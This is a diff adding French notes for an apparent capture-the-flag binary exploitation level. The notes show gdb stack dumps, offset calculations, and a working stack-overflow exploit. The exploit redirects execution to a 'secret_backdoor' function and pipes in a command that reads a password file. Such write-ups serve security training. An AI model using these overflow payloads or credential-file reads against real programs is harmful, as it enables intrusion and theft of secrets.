@@ -1,0 +1,86 @@
+adresse de secret_backdoor: 0x55555555488c
+
+```gdb
+Breakpoint 6, 0x0000555555554910 in handle_msg ()
+(gdb) x/30gx $rsp
+0x7fffffffe510:	0x000000000000000a	0x0000555555554c69
+0x7fffffffe520:	0x00007ffff7ff7000	0x00007ffff7a94713
+0x7fffffffe530:	0x00007ffff7dd4260	0x00007ffff7dd4260
+0x7fffffffe540:	0x000000000000000a	0x00007ffff7ff7000
+0x7fffffffe550:	0x000000000000002d	0x00007ffff7a945da
+0x7fffffffe560:	0x0000000000000086	0x000000000000002d
+0x7fffffffe570:	0x000000000000000a	0x0000555555554c10
+0x7fffffffe580:	0x00007fffffffe6c0	0x00007ffff7a95d45
+0x7fffffffe590:	0x00007ffff7dd4260	0x00000000f7a9608f
+0x7fffffffe5a0:	0x0000000000000000	0x0000000000000000
+0x7fffffffe5b0:	0x0000000000000000	0x0000000000000000
+0x7fffffffe5c0:	0x0000008c00000000	0x00007fffffffe5e0
+0x7fffffffe5d0:	0x00007fffffffe5e0	0x0000555555554abd
+0x7fffffffe5e0:	0x0000000000000000	0x00007ffff7a3d7ed
+0x7fffffffe5f0:	0x0000000000000000	0x00007fffffffe6c8
+(gdb) c
+Continuing.
+>: Enter your username
+>>: AAAAAAAABBBBBBBB
+>: Welcome, AAAAAAAABBBBBBBB
+
+Breakpoint 2, 0x0000555555554915 in handle_msg ()
+(gdb) x/30gx $rsp
+0x7fffffffe510:	0x000000000000000a	0x0000555555554c69
+0x7fffffffe520:	0x00007ffff7ff7000	0x00007ffff7a94713
+0x7fffffffe530:	0x00007ffff7dd4260	0x00007ffff7dd4260
+0x7fffffffe540:	0x000000000000000a	0x00007ffff7ff7000
+0x7fffffffe550:	0x000000000000002d	0x00007ffff7a945da
+0x7fffffffe560:	0x0000000000000086	0x000000000000002d
+0x7fffffffe570:	0x000000000000000a	0x0000555555554c10
+0x7fffffffe580:	0x00007fffffffe6c0	0x00007ffff7a95d45
+0x7fffffffe590:	0x00007ffff7dd4260	0x41414141f7a9608f
+0x7fffffffe5a0:	0x4242424241414141	0x0000000a42424242
+0x7fffffffe5b0:	0x0000000000000000	0x0000000000000000
+0x7fffffffe5c0:	0x0000008c00000000	0x00007fffffffe5e0
+0x7fffffffe5d0:	0x00007fffffffe5e0	0x0000555555554abd
+0x7fffffffe5e0:	0x0000000000000000	0x00007ffff7a3d7ed
+0x7fffffffe5f0:	0x0000000000000000	0x00007fffffffe6c8
+(gdb) c
+Continuing.
+>: Msg @Unix-Dude
+>>: 1111111122222222
+
+Breakpoint 3, 0x0000555555554924 in handle_msg ()
+(gdb) x/30gx $rsp
+0x7fffffffe510:	0x3131313131313131	0x3232323232323232
+0x7fffffffe520:	0x000000000000000a	0x0000000000000000
+0x7fffffffe530:	0x0000000000000000	0x0000000000000000
+0x7fffffffe540:	0x0000000000000000	0x0000000000000000
+0x7fffffffe550:	0x0000000000000000	0x0000000000000000
+0x7fffffffe560:	0x0000000000000000	0x0000000000000000
+0x7fffffffe570:	0x0000000000000000	0x0000000000000000
+0x7fffffffe580:	0x0000000000000000	0x0000000000000000
+0x7fffffffe590:	0x0000000000000000	0x4141414100000000
+0x7fffffffe5a0:	0x4242424241414141	0x0000000a42424242
+0x7fffffffe5b0:	0x0000000000000000	0x0000000000000000
+0x7fffffffe5c0:	0x0000008c00000000	0x00007fffffffe5e0
+0x7fffffffe5d0:	0x00007fffffffe5e0	0x0000555555554abd
+0x7fffffffe5e0:	0x0000000000000000	0x00007ffff7a3d7ed
+0x7fffffffe5f0:	0x0000000000000000	0x00007fffffffe6c8
+```
+
+Le troizieme argument du strncpy de set_msg est stockée à `0x7fffffffe5c4`
+set_username écrit à partir de '0x7fffffffe59c'
+pour l'overwrite il faut écrire 41 ou plus. mais pas trop.
+
+offset de l'adresse de retour: 0x7fffffffe5d8 - 0x7fffffffe510 = 200
+donc faut ecrire 202 = 0xCA ?
+
+l'adresse de la backdoor c'est 0x88c
+
+Exploit:
+username: python -c 'print("A" * 40 + "\xCA")'
+msg: python -c 'print(200 * "B" + "\x8c" + "\x08")'
+attack: echo "echo -n SUCCESS ; cat /home/users/end/.pass"
+
+ligne complète:
+(python -c 'print("A" * 40 + "\xCA")' ; python -c 'print(200 * "B" + "\x8c" + "\x48")' ; echo "echo -n 'SUCCESS ' ; cat /home/users/end/.pass" ) | ./level09 | grep SUCCESS
+
+si ça marche pas, remplacer le 4 de \x48 par un autre chiffre et réessayer,
+etc jusqu'à ce que ça marche
